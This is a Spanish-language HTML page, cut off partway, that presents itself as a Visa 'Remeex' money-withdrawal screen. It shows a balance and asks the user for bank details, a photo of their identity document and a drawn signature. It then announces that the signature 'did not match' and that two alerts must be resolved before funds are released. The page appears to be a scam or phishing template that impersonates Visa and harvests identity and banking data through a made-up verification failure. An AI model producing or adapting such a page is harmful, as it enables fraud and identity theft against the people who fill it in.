<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Visa Remeex - Retirar Dinero (Versión Mejorada)</title>
  <!-- Se modifica la meta viewport para deshabilitar el zoom -->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <meta name="description" content="Página de Retiro de Dinero - Visa Remeex Premium" />

  <!-- FAVICON opcional -->
  <link
    rel="icon"
    href="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png"
    type="image/png"
  />

  <!-- Fuentes e íconos -->
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap"
    rel="stylesheet"
  />
  <link
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"
    rel="stylesheet"
  />

  <style>
    /* Eliminar resaltado al tocar en dispositivos móviles */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', 'Plus Jakarta Sans', sans-serif;
      -webkit-tap-highlight-color: transparent;
    }
    /* Mejora en la legibilidad: Justificar textos generales */
    p {
      text-align: justify;
      margin-bottom: 1rem;
    }
    :root {
      --primary: #1434CB;
      --secondary: #142C8E;
      --primary-dark: #0d153e;
      --accent: #60a5fa;
      --success: #10B981;
      --danger: #EF4444;
      --warning: #F59E0B;
      --info: #3B82F6;
      --background: #EEF2FF;
      --background-dark: #E0E7FF;
      --card-bg: rgba(255, 255, 255, 0.95);
      --text-primary: #1E293B;
      --text-secondary: #64748B;
      --highlight-bg: #fffbeb;
      --highlight-border: #fef3c7;
      --border-radius-xl: 28px;
      --border-radius-lg: 24px;
      --border-radius: 16px;
      --border-radius-sm: 12px;
      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
      --shadow-sm: 0 4px 6px -1px rgb(0 0 0 / 0.05), 0 2px 4px -2px rgb(0 0 0 / 0.05);
      --shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
      --shadow-lg: 0 20px 25px -5px rgba(0, 0, 0, 0.1);
      --aurora-gradient: linear-gradient(
        120deg,
        rgba(20, 52, 203, 0.4),
        rgba(25, 35, 102, 0.3),
        rgba(20, 52, 203, 0.3),
        rgba(20, 52, 203, 0.2)
      );
    }
    body {
      min-height: 100vh;
      background: linear-gradient(135deg, var(--background) 0%, var(--background-dark) 100%);
      color: var(--text-primary);
      line-height: 1.6;
      overflow-x: hidden;
      display: flex;
      justify-content: center;
      padding: 1rem;
    }
    .container {
      max-width: 600px;
      width: 100%;
      margin: 2rem auto;
      background: var(--card-bg);
      border-radius: var(--border-radius-xl);
      backdrop-filter: blur(10px);
      position: relative;
      border: 2px solid #ffffff;
      animation: glow 6s ease infinite, border-blink 6s linear infinite;
      box-shadow: 0 0 30px rgba(20, 52, 203, 0.15), 0 0 60px rgba(20, 52, 203, 0.05);
      transition: var(--transition);
    }
    .container:hover {
      transform: translateY(-4px);
      box-shadow: 0 0 50px rgba(20, 52, 203, 0.3), 0 0 80px rgba(20, 52, 203, 0.15);
    }
    @keyframes glow {
      0%, 100% {
        box-shadow: 0 0 30px rgba(20, 52, 203, 0.2), 0 0 60px rgba(20, 52, 203, 0.1);
      }
      50% {
        box-shadow: 0 0 50px rgba(20, 52, 203, 0.4), 0 0 80px rgba(20, 52, 203, 0.2);
      }
    }
    @keyframes border-blink {
      0%   { border-color: #ffffff; }
      33%  { border-color: #d1d5db; }
      66%  { border-color: #60a5fa; }
      100% { border-color: #ffffff; }
    }
    .container-content {
      padding: 1.5rem;
      position: relative;
    }
    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1.5rem;
    }
    .top-bar img {
      height: 36px;
      object-fit: contain;
      opacity: 0.9;
      transition: var(--transition);
    }
    .top-bar img:hover {
      opacity: 1;
      transform: scale(1.05);
    }
    .user-profile {
      font-weight: 600;
      font-size: 1rem;
      color: var(--text-primary);
    }
    /* Tarjeta SALDO */
    .card {
      background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
      color: white;
      border-radius: var(--border-radius-lg);
      padding: 2rem;
      box-shadow: var(--shadow);
      margin-bottom: 2rem;
      transition: var(--transition);
      position: relative;
      overflow: hidden;
    }
    .card:hover {
      transform: translateY(-3px);
      box-shadow: var(--shadow-lg);
    }
    .balance-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1rem;
    }
    .balance-amount {
      font-size: 1.8rem;
      font-weight: 700;
      margin: 0.5rem 0 1rem 0;
      letter-spacing: -1px;
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      gap: 0.4rem;
    }
    .card::before {
      content: "";
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: var(--aurora-gradient);
      opacity: 0.1;
      animation: aurora-animation 15s ease infinite;
      z-index: 0;
    }
    @keyframes aurora-animation {
      0%   { background-position: 0% 50%; }
      50%  { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    @keyframes blinkEffect {
      0%   { color: #10B981; }
      50%  { color: #ffffff; }
      100% { color: #10B981; }
    }
    .blink {
      animation: blinkEffect 1.2s infinite;
      font-weight: 700;
    }
    /****************************************************
     * Tarjetas VISA-CARD (Secciones)
     ****************************************************/
    .visa-card {
      background: var(--card-bg);
      border-radius: var(--border-radius-lg);
      padding: 2rem;
      box-shadow: var(--shadow);
      margin-bottom: 2rem;
      transition: var(--transition);
      position: relative;
      overflow: hidden;
      border: 1px solid rgba(0,0,0,0.05);
      display: none; /* controlado con JS */
      /* Borde izquierdo destacado */
      border-left: 5px solid var(--primary);
    }
    .visa-card.active {
      display: block;
    }
    .visa-card:hover {
      transform: translateY(-2px);
      box-shadow: var(--shadow-lg);
    }
    .visa-card h2 {
      display: flex;
      align-items: center;
      font-size: 1.4rem;
      margin-bottom: 1.2rem;
      color: var(--primary);
      gap: 0.8rem;
      padding-bottom: 0.8rem;
      border-bottom: 1px solid rgba(0,0,0,0.1);
    }
    .visa-card h2 i {
      font-size: 1.6rem;
      color: var(--primary);
    }
    .status-banner {
      font-size: 0.95rem;
      color: #fff;
      background: rgba(0,0,0,0.15);
      padding: 0.5rem;
      border-radius: var(--border-radius-sm);
      margin-top: 1rem;
      text-align: center;
      transition: opacity 0.5s;
    }
    /****************************************************
     * Secciones de texto/información
     ****************************************************/
    .instruction-step {
      margin-bottom: 1.5rem;
      padding: 1rem;
      background: var(--highlight-bg);
      border: 1px solid var(--highlight-border);
      border-radius: var(--border-radius-sm);
      position: relative;
    }
    .instruction-step .step-number {
      position: absolute;
      top: -15px;
      left: -15px;
      width: 30px;
      height: 30px;
      background: var(--primary);
      color: white;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      z-index: 1;
      box-shadow: 0 2px 4px rgba(0,0,0,0.2);
    }
    .info-box {
      background: rgba(59, 130, 246, 0.1);
      border-left: 4px solid var(--info);
      padding: 1rem;
      margin: 1rem 0;
      border-radius: var(--border-radius-sm);
    }
    .warning-box {
      background: rgba(245, 158, 11, 0.1);
      border-left: 4px solid var(--warning);
      padding: 1rem;
      margin: 1rem 0;
      border-radius: var(--border-radius-sm);
    }
    .success-box {
      background: rgba(16, 185, 129, 0.1);
      border-left: 4px solid var(--success);
      padding: 1rem;
      margin: 1rem 0;
      border-radius: var(--border-radius-sm);
    }
    .data-summary {
      margin-top: 1rem;
      border: 1px solid rgba(0, 0, 0, 0.1);
      border-radius: var(--border-radius-sm);
      padding: 1rem;
      background: #fff;
      color: var(--text-primary);
      margin-bottom: 1rem;
      box-shadow: 0 2px 5px rgba(0,0,0,0.05);
    }
    .data-summary h3 {
      background: rgba(20, 52, 203, 0.08);
      padding: 0.8rem 1rem;
      margin: -1rem -1rem 1rem -1rem;
      border-radius: var(--border-radius) var(--border-radius) 0 0;
      font-weight: 600;
      color: var(--primary-dark);
    }
    .data-item {
      margin-bottom: 0.5rem;
      font-size: 0.95rem;
      line-height: 1.4;
    }
    /****************************************************
     * Botones
     ****************************************************/
    .btn {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 0.4rem;
      padding: 0.75rem 1.2rem;
      border-radius: var(--border-radius-sm);
      font-weight: 600;
      font-size: 0.95rem;
      transition: var(--transition);
      border: none;
      cursor: pointer;
      position: relative;
      overflow: hidden;
      z-index: 1;
      letter-spacing: 0.02em;
      min-width: 140px;
    }
    .btn::before {
      content: '';
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      background: linear-gradient(90deg, transparent, var(--primary), var(--secondary), transparent);
      background-size: 200% 100%;
      border-radius: var(--border-radius-sm);
      animation: border-glow 3s ease infinite;
      filter: blur(8px);
      opacity: 0.7;
      z-index: -1;
    }
    @keyframes border-glow {
      0%   { background-position: -100% 0; }
      50%  { background-position: 100% 0; }
      100% { background-position: -100% 0; }
    }
    .btn:hover {
      transform: translateY(-2px);
      box-shadow: var(--shadow-sm);
    }
    .btn-primary {
      background: linear-gradient(135deg, var(--primary), var(--secondary));
      color: #fff;
    }
    .btn-secondary {
      background: var(--secondary);
      color: #fff;
    }
    .btn-outline {
      background: transparent;
      color: var(--primary);
      border: 2px solid var(--primary);
    }
    .btn-outline:hover {
      background: rgba(20, 52, 203, 0.05);
    }
    .btn-danger {
      background: var(--danger);
      color: #fff;
    }
    .btn-success {
      background: var(--success);
      color: #fff;
    }
    .btn-disabled {
      opacity: 0.6;
      cursor: not-allowed;
      pointer-events: none;
    }
    /****************************************************
     * Listas con íconos
     ****************************************************/
    .icon-list {
      margin: 1rem 0;
      text-align: left;
    }
    .icon-list li {
      margin-bottom: 0.8rem;
      display: flex;
      align-items: flex-start;
      gap: 0.5rem;
      font-size: 0.95rem;
    }
    .icon-list li i {
      color: var(--primary);
      font-size: 1.1rem;
      margin-top: 2px;
      transition: var(--transition);
    }
    .icon-list li i:hover {
      transform: scale(1.1);
    }
    /****************************************************
     * Previsualización de imágenes (Documento)
     ****************************************************/
    .preview-container {
      border: 1px dashed var(--primary);
      padding: 1rem;
      border-radius: var(--border-radius-sm);
      margin-bottom: 1rem;
      display: none;
      position: relative;
      text-align: center;
      background-color: #fff;
    }
    .preview-container.active {
      display: block;
    }
    .preview-container img {
      max-width: 100%;
      border-radius: var(--border-radius-sm);
    }
    /****************************************************
     * Firma digital
     ****************************************************/
    .signature-canvas {
      border: 2px dashed var(--primary);
      border-radius: var(--border-radius-sm);
      width: 100%;
      height: 220px;
      background: #fff;
      margin-bottom: 1rem;
      position: relative;
      cursor: crosshair;
    }
    /****************************************************
     * Overlays (general)
     ****************************************************/
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: none;
      justify-content: center;
      align-items: center;
      z-index: 999;
      padding: 1rem;
    }
    .overlay.active {
      display: flex;
      backdrop-filter: blur(5px);
    }
    .modal {
      background: rgba(255, 255, 255, 0.95);
      border-radius: var(--border-radius-lg);
      padding: 1.5rem;
      width: 90%;
      max-width: 420px;
      box-shadow: var(--shadow-lg);
      text-align: center;
      position: relative;
      backdrop-filter: blur(8px);
      border: 2px solid #fff;
      animation: glow 6s ease infinite, border-blink 6s linear infinite;
    }
    .modal.modal-glow {
      background: #fff !important;
      box-shadow: 0 0 60px rgba(20, 52, 203, 0.5), 0 0 120px rgba(20, 52, 203, 0.3) !important;
      animation: glow 3s ease infinite, border-blink 3s linear infinite !important;
    }
    .modal h3 {
      font-size: 1.3rem;
      margin-bottom: 1rem;
      color: var(--primary);
      border-bottom: 1px solid rgba(0,0,0,0.1);
      padding-bottom: 0.8rem;
    }
    .modal p {
      font-size: 0.95rem;
      color: var(--text-secondary);
      margin-bottom: 1rem;
      line-height: 1.4;
    }
    /****************************************************
     * Contadores (countdown)
     ****************************************************/
    .countdown {
      font-size: 0.95rem;
      font-weight: 500;
      color: var(--primary);
      margin-top: 0.7rem;
      text-align: center;
      background: rgba(20, 52, 203, 0.08);
      padding: 0.4rem;
      border-radius: var(--border-radius-sm);
      display: inline-block;
      min-width: 120px;
    }
    /****************************************************
     * Animaciones
     ****************************************************/
    .banner-flash {
      background: linear-gradient(45deg, rgba(16, 185, 129, 0.1), rgba(59, 130, 246, 0.1));
      padding: 1rem;
      border-radius: var(--border-radius-sm);
      margin: 1rem 0;
      position: relative;
      overflow: hidden;
      border: 1px solid rgba(16, 185, 129, 0.2);
    }
    .banner-flash::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
      animation: shine 3s infinite;
    }
    @keyframes shine {
      0% { left: -100%; }
      20% { left: 100%; }
      100% { left: 100%; }
    }
    @keyframes readyPulse {
      0%   { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.5); }
      70%  { box-shadow: 0 0 0 10px rgba(16, 185, 129, 0); }
      100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
    }
    .btn-ready {
      animation: readyPulse 2s infinite;
    }
    @keyframes highlight {
      0%   { background-color: rgba(245, 158, 11, 0.3); }
      50%  { background-color: rgba(245, 158, 11, 0.1); }
      100% { background-color: rgba(245, 158, 11, 0.3); }
    }
    .highlight-element {
      animation: highlight 2s ease-in-out infinite;
      padding: 0.5rem;
      border-radius: var(--border-radius-sm);
    }
    .numbered-list {
      counter-reset: step;
      list-style-type: none;
      padding-left: 0;
    }
    .numbered-list li {
      position: relative;
      padding-left: 3rem;
      margin-bottom: 1.5rem;
      min-height: 2.5rem;
      display: flex;
      align-items: center;
    }
    .numbered-list li::before {
      counter-increment: step;
      content: counter(step);
      position: absolute;
      left: 0;
      top: 50%;
      transform: translateY(-50%);
      background: var(--primary);
      color: white;
      width: 2.2rem;
      height: 2.2rem;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
    }
    .divider {
      display: flex;
      align-items: center;
      margin: 1.5rem 0;
    }
    .divider::before, .divider::after {
      content: "";
      flex: 1;
      border-bottom: 1px solid rgba(0,0,0,0.1);
    }
    .divider-text {
      padding: 0 1rem;
      color: var(--text-secondary);
      font-size: 0.9rem;
    }
    @keyframes actualizacion {
      0% { transform: translateY(-10px); opacity: 0; }
      100% { transform: translateY(0); opacity: 1; }
    }
    .dato-actualizado {
      animation: actualizacion 0.5s ease;
    }
    .banco-logo {
      transition: opacity 0.3s ease;
    }
    /****************************************************
     * Barra de Progreso (Progreso de Retiro)
     ****************************************************/
    .progress-bar-container {
      display: flex;
      flex-direction: column;
      gap: 0.5rem;
      margin-bottom: 2rem;
      padding: 1rem;
      background: #fff;
      border-radius: var(--border-radius);
      align-items: center;
      box-shadow: var(--shadow-sm);
    }
    .progress-bar-info {
      display: flex;
      align-items: center;
      gap: 0.6rem;
      font-weight: 600;
      color: var(--primary);
      font-size: 1rem;
      width: 100%;
      justify-content: space-between;
    }
    .progress-bar-info img {
      height: 28px;
      object-fit: contain;
    }
    .progress-bar-wrapper {
      width: 100%;
      height: 10px;
      background: rgba(20, 52, 203, 0.1);
      border-radius: 5px;
      overflow: hidden;
    }
    .progress-bar-fill {
      height: 100%;
      /* Se hace transición a verde con brillo */
      background: linear-gradient(90deg, var(--success), #09956e);
      box-shadow: 0 0 10px var(--success), 0 0 20px var(--success);
      transition: width 0.4s ease;
      width: 0%;
    }
    /****************************************************
     * Ajustes Responsive (Originales)
     ****************************************************/
    @media (max-width: 768px) {
      .balance-amount {
        font-size: 1.6rem;
      }
      .modal h3 {
        font-size: 1.15rem;
      }
      .visa-card h2 {
        font-size: 1.2rem;
      }
      .visa-card h2 i {
        font-size: 1.4rem;
      }
      .instruction-step {
        padding: 0.8rem;
      }
    }
    @media (max-width: 600px) {
      .container {
        margin: 1rem auto;
        max-width: 100%;
      }
      .container-content {
        padding: 1rem;
      }
      .card, .visa-card {
        padding: 1rem;
      }
      .modal {
        padding: 1rem;
      }
    }
    /****************************************************
     * Animaciones adicionales
     ****************************************************/
    @keyframes loadingDot {
      0%, 80%, 100% { transform: scale(0); opacity: 0.5; }
      40% { transform: scale(1); opacity: 1; }
    }
    @keyframes pulseBackground {
      0%, 100% { background-color: rgba(20, 52, 203, 0.05); }
      50% { background-color: rgba(20, 52, 203, 0.15); }
    }
    @keyframes fadeInUp {
      from {
        opacity: 0;
        transform: translate(-50%, 20px);
      }
      to {
        opacity: 1;
        transform: translate(-50%, 0);
      }
    }
    .btn-support {
      background: #25D366;
      color: white;
      padding: 0.8rem;
      border-radius: var(--border-radius);
      text-decoration: none;
      font-weight: 600;
      transition: all 0.3s ease;
    }
    .btn-support:hover {
      background: #22c85a;
    }
    /****************************************************
     * Estilos para botones con contador integrado
     ****************************************************/
    .btn-countdown {
      position: relative;
      overflow: hidden;
      min-width: 180px;
      transition: all 0.3s ease;
    }
    .btn-countdown::before {
      content: '';
      position: absolute;
      bottom: 0;
      left: 0;
      height: 3px;
      background: rgba(255, 255, 255, 0.7);
      animation: countdown-progress 5s linear forwards;
      z-index: 0;
    }
    @keyframes countdown-progress {
      0% { width: 100%; }
      100% { width: 0%; }
    }
    .btn-waiting {
      background: linear-gradient(135deg, #64748B, #475569) !important;
      cursor: not-allowed;
    }
    .btn-waiting:hover {
      transform: none !important;
      box-shadow: none !important;
    }
    .btn-active {
      transform: scale(0.98);
      box-shadow: inset 0 3px 5px rgba(0, 0, 0, 0.1);
    }
    @keyframes success-animation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    .btn-success-animation {
      background: linear-gradient(270deg, #10B981, #059669);
      background-size: 200% 200%;
      animation: success-animation 2s ease infinite;
    }
    /****************************************************
     * Mejoras para móvil - Integradas aquí
     ****************************************************/
    /* Ajustes generales para pantallas pequeñas */
    @media (max-width: 480px) {
      body {
        padding: 0.5rem;
      }
      .container {
        margin: 0.5rem auto;
        border-radius: var(--border-radius-lg);
      }
      .container-content {
        padding: 0.8rem;
      }
      /* Mejor espaciado en tarjetas */
      .card, .visa-card {
        padding: 1rem;
        margin-bottom: 1.5rem;
      }
      /* Fuentes más pequeñas */
      .balance-amount {
        font-size: 1.4rem;
      }
      .visa-card h2 {
        font-size: 1.1rem;
        gap: 0.5rem;
      }
      .visa-card h2 i {
        font-size: 1.2rem;
      }
      /* Ajuste para cajas de datos */
      .data-summary {
        padding: 0.8rem;
      }
      .data-summary h3 {
        padding: 0.6rem 0.8rem;
        margin: -0.8rem -0.8rem 0.8rem -0.8rem;
        font-size: 0.95rem;
      }
      .data-item {
        font-size: 0.9rem;
        margin-bottom: 0.4rem;
      }
      /* Botones más amigables */
      .btn {
        padding: 0.7rem 1rem;
        font-size: 0.9rem;
        min-width: 120px;
      }
      /* Modales más ajustados */
      .modal {
        width: 95%;
        padding: 1rem;
      }
      .modal h3 {
        font-size: 1.1rem;
        margin-bottom: 0.8rem;
      }
      /* Ajustes para listas */
      .icon-list li {
        font-size: 0.9rem;
        margin-bottom: 0.6rem;
        gap: 0.4rem;
      }
      /* Barra de progreso */
      .progress-bar-container {
        padding: 0.7rem;
        margin-bottom: 1.5rem;
      }
      .progress-bar-info {
        font-size: 0.9rem;
      }
      .progress-bar-info img {
        height: 24px;
      }
    }
    /* Ajustes específicos para pantallas extremadamente pequeñas */
    @media (max-width: 360px) {
      /* Tarjetas datos bancarios */
      .data-summary {
        font-size: 0.85rem;
      }
      /* Ajustes para botones en vertical */
      .btn {
        min-width: 100%;
        margin-bottom: 0.5rem;
      }
      /* Forzar layout vertical en algunos contenedores */
      div[style*="display:flex; gap:1rem; justify-content:flex-end"] {
        flex-direction: column;
      }
      div[style*="display:flex; justify-content:space-between"] {
        flex-direction: column;
        gap: 0.5rem;
      }
      /* Banner flash más compacto */
      .banner-flash {
        padding: 0.7rem;
      }
      /* Cajas de resumen más compactas */
      .success-box, .info-box, .warning-box {
        padding: 0.7rem;
        margin: 0.7rem 0;
      }
      /* Ajuste para la barra superior */
      .top-bar {
        flex-direction: column;
        align-items: flex-start;
        gap: 0.5rem;
      }
      /* Texto más pequeño en instrucciones */
      .instruction-step {
        padding: 0.7rem;
        font-size: 0.85rem;
      }
      /* Ajustar título */
      .visa-card h2 {
        font-size: 1rem;
      }
    }
    /* Ajustes para formularios y inputs */
    @media (max-width: 480px) {
      input[type="text"],
      input[type="file"] {
        padding: 0.6rem !important;
        font-size: 0.9rem !important;
      }
      .form-group {
        margin-bottom: 0.8rem !important;
      }
      label {
        font-size: 0.85rem !important;
      }
      /* Ajustes para firma */
      .signature-canvas {
        height: 180px;
      }
      /* Botones de firma en columna */
      div[style*="display: flex; gap: 1rem; margin-bottom: 1rem;"] {
        flex-direction: column;
        gap: 0.5rem;
      }
    }
    /* Optimizaciones generales para todos los tamaños */
    .highlight-element {
      overflow-wrap: break-word;
      word-wrap: break-word;
    }
    /* Mejor visibilidad para montos */
    .blink {
      display: inline-block;
      margin: 0.2rem 0;
    }
    /* Mejor presentación para los resúmenes de montos */
    @media (max-width: 480px) {
      div[style*="display:flex; align-items:center; gap:10px; flex-wrap:nowrap"] {
        flex-wrap: wrap !important;
        justify-content: center;
      }
      /* Contenedores de número y banco más adaptables */
      div[style*="display:grid; grid-template-columns:120px 1fr"] {
        grid-template-columns: 100px 1fr;
        gap: 0.5rem;
      }
      /* Eliminar efectos de hover en móvil */
      .container:hover,
      .card:hover,
      .visa-card:hover,
      .btn:hover {
        transform: none;
      }
    }
    /* Mejoras para los bloques de datos en overlays */
    @media (max-width: 480px) {
      div[style*="display:grid; grid-template-columns:repeat(2, 1fr)"] {
        grid-template-columns: 1fr !important;
        gap: 0.7rem !important;
      }
      /* Lista con pasos numerados */
      .numbered-list div.list-item {
        align-items: flex-start !important;
        margin-bottom: 0.8rem !important;
      }
      /* Ajuste para fuente en modal */
      #overlayBankConnection .overlay-container {
        width: 95%;
        padding: 1.5rem;
      }
      #overlayBankConnection .ai-orb {
        width: 180px;
        height: 180px;
      }
      #overlayBankConnection .ai-orb-container {
        height: 180px;
      }
    }
  </style>
</head><body>
  <div class="container">
    <div class="container-content">
      <!-- Barra superior (logo y nombre de usuario) -->
      <div class="top-bar">
        <img
          src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png"
          alt="Visa Logo"
          id="visaMainLogo"
        />
        <!-- Nombre que se cargará dinámicamente -->
        <div class="user-profile" id="userName">[NombreUsuario]</div>
      </div>

      <!-- Tarjeta con Saldo disponible -->
      <div class="card">
        <div class="balance-header">
          <h2>Saldo disponible</h2>
          <i class="fas fa-ellipsis-h"></i>
        </div>
        <div class="balance-amount" id="balanceAmount">0,00 Bs</div>
        <div class="status-banner" id="statusBanner"></div>
      </div>

      <!-- Barra de Progreso (ahora debajo de la tarjeta) -->
      <div class="progress-bar-container">
        <div class="progress-bar-info">
          <span>Progreso de Retiro</span>
          <span id="progressPercentage">0%</span>
          <img id="bankProgressLogo" src="" alt="Logo Banco" />
        </div>
        <div class="progress-bar-wrapper">
          <div class="progress-bar-fill" id="progressBarFill"></div>
        </div>
      </div>

      <!-- (1) Retirar a mi banco -->
      <div class="visa-card active" id="datosRetiroSection">
        <h2><i class="fas fa-hand-holding-usd"></i> Retirar a mi banco</h2>
        <p>
          Verifica la información de tu beneficiario y tus datos bancarios
          antes de continuar.
        </p>
        <div class="data-summary">
          <h3>Datos del Beneficiario</h3>
          <div class="data-item" id="benefName">
            Nombre: <strong>[Nombre Beneficiario]</strong>
          </div>
          <div class="data-item" id="benefDoc">
            Documento: <strong>[Documento Beneficiario]</strong>
          </div>
          <div class="data-item" id="benefBirth">
            F. Nac: <strong>[Fecha de Nacimiento]</strong>
          </div>
        </div>
        <div class="data-summary">
          <h3>Datos Bancarios</h3>
          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:0.5rem;">
            <div class="data-item" id="nombreBanco">
              Banco: <strong>[Nombre Banco]</strong>
            </div>
            <!-- Logo banco a la derecha -->
            <img id="bankLogoSmall" src="" alt="Logo Banco" style="max-height:30px;" />
          </div>
          <div class="data-item" id="numeroCuenta">
            N° de Cuenta: <strong>[Número de Cuenta]</strong>
          </div>
          <div class="data-item" id="tipoCuenta">
            Tipo: <strong>[Tipo de Cuenta]</strong>
          </div>
        </div>
        <div style="display:flex; gap:1rem; justify-content:flex-end;">
          <button class="btn btn-primary btn-disabled btn-countdown" id="confirmInfoBtn">
            <i class="fas fa-clock"></i> Espera 5s
            <span class="btn-tooltip">Botón bloqueado temporalmente</span>
          </button>
          <div class="countdown" id="countdownRetiroBtn" style="display:none;"></div>
        </div>
      </div>      <!-- (2) Subir Documento de Identidad -->
      <div class="visa-card" id="uploadSection">
        <h2><i class="fas fa-file-upload"></i> Documento de Identidad</h2>
        <p>
          Carga tu documento de identidad (solo imágenes). Debe ser vigente,
          legible y con la firma visible.
        </p>
        <label for="idDocument" style="display:block; margin-bottom:0.5rem;">
          Seleccionar archivo (solo imágenes)
        </label>
        <input type="file" id="idDocument" accept="image/*" />
        <div class="preview-container" id="previewContainer">
          <img id="docPreview" src="#" alt="Vista Previa" />
          <div
            style="margin-top: 1rem; color: var(--text-secondary); font-size: 0.95rem;"
          >
            <strong>Requisitos:</strong>
            <ul style="padding-left: 20px; margin-top: 5px;">
              <li>Documento vigente</li>
              <li>Imagen legible</li>
              <li>Firma y datos visibles</li>
            </ul>
          </div>
        </div>
        <div style="text-align:right;">
          <button class="btn btn-success btn-disabled" id="confirmDocBtn" style="display:none;">
            <i class="fas fa-check"></i> Confirmar Documento
          </button>
        </div>
      </div>

      <!-- (3) Firma Digital -->
      <div class="visa-card" id="signatureSection">
        <h2><i class="fas fa-file-signature"></i> Firma Digital</h2>
        <p style="font-size:0.93rem; line-height:1.4;">
          <i class="fas fa-check-circle" style="color:var(--success);"></i>
          Por favor, firma en el recuadro para autorizar este retiro.<br/>
          <i class="fas fa-shield-alt" style="color:var(--primary);"></i>
          Tu firma debe coincidir con la de tu documento de identidad para comprobar que eres el titular.<br/>
          <i class="fas fa-exclamation-triangle" style="color:var(--warning);"></i>
          Si no coincide, se solicitará otra verificación adicional.
        </p>
        <canvas class="signature-canvas" id="signatureCanvas"></canvas>
        <div style="display: flex; gap: 1rem; margin-bottom: 1rem;">
          <button class="btn btn-danger" id="clearSignatureBtn">
            <i class="fas fa-eraser"></i> Limpiar Firma
          </button>
          <button class="btn btn-success" id="saveSignatureBtn">
            <i class="fas fa-save"></i> Guardar Firma
          </button>
        </div>
      </div>

      <!-- (4) Verificación de Seguridad (post-firma no coincidente) -->
      <div class="visa-card" id="securityVerification1">
        <h2>
          <i class="fas fa-shield-alt"></i> Verificación de Seguridad
        </h2>
        <p id="securityVerificationText1">
          Tu firma no coincide con la que aparece en tu documento de identidad.
          Por ello, necesitamos validar que nadie esté suplantando tu identidad.
          Debes pasar por un proceso adicional de seguridad.
        </p>
        <p>
          Serás dirigido(a) a una sección de seguridad para confirmar tu titularidad.
          Por favor, sigue los pasos solicitados.
        </p>
        <div style="text-align:right;">
          <button class="btn btn-primary btn-disabled btn-countdown" id="continueSecurityBtn1">
            <i class="fas fa-clock"></i> Espera 5s
            <span class="btn-tooltip">Botón bloqueado temporalmente</span>
          </button>
          <div class="countdown" id="countdownSecurity1" style="display:none;"></div>
        </div>
      </div>

      <!-- (5) Tarjeta: ¿Por qué esta verificación? -->
      <div class="visa-card" id="securityVerification2">
        <h2><i class="fas fa-question-circle"></i> ¿Por qué esta verificación?</h2>
        <ul class="icon-list">
          <li><i class="fas fa-user-shield"></i> Evitar suplantación de identidad.</li>
          <li><i class="fas fa-lock"></i> Proteger tu cuenta de accesos no autorizados.</li>
          <li><i class="fas fa-ban"></i> Prevenir bloqueos o retenciones en tu banco.</li>
          <li><i class="fas fa-gavel"></i> Cumplir con normas legales de seguridad.</li>
        </ul>
        <div style="text-align:right;">
          <button class="btn btn-primary btn-disabled btn-countdown" id="continueSecurityBtn2">
            <i class="fas fa-clock"></i> Espera 5s
            <span class="btn-tooltip">Botón bloqueado temporalmente</span>
          </button>
          <div class="countdown" id="countdownSecurity2" style="display:none;"></div>
        </div>
      </div>

      <!-- (6) SECCIÓN #1 -->
      <div class="visa-card" id="securityVerification3A">
        <h2><i class="fas fa-info-circle"></i> Tu dinero está listo</h2>
        <div class="success-box">
          <p style="margin-bottom:0.5rem; font-size:1.1rem;">
            <strong id="nombreUsuarioAviso" style="color: var(--primary);">[NombreCompleto]</strong>, tu retiro está aprobado,
            y estamos listos para enviar <strong id="saldoListo" style="color:var(--success);">[Saldo en Bs]</strong> a tu cuenta.
          </p>
        </div>
        <div class="warning-box">
          <h3 style="font-size: 1.05rem; margin-bottom:0.5rem;">
            <i class="fas fa-exclamation-triangle"></i> Tenemos 2 alertas que resolver:
          </h3>
          <div class="numbered-list" style="margin-left:0; padding-left:0;">
            <div class="list-item" style="display:flex; margin-bottom:1rem; align-items:flex-start;">
              <div style="background:var(--primary); color:white; width:24px; height:24px; border-radius:50%; flex-shrink:0; display:flex; align-items:center; justify-content:center; margin-right:10px; margin-top:2px;">1</div>
              <div>
                <strong style="color:var(--text-primary);">Tu firma no coincidió</strong> con nuestros registros y no pudimos confirmar que eres el titular de la cuenta <strong class="numeroCuentaUsuario"></strong> en <strong class="nombreBancoUsuario"></strong>.
              </div>
            </div>
            <div class="list-item" style="display:flex; margin-bottom:1rem; align-items:flex-start;">
              <div style="background:var(--primary); color:white; width:24px; height:24px; border-radius:50%; flex-shrink:0; display:flex; align-items:center; justify-content:center; margin-right:10px; margin-top:2px;">2</div>
              <div>
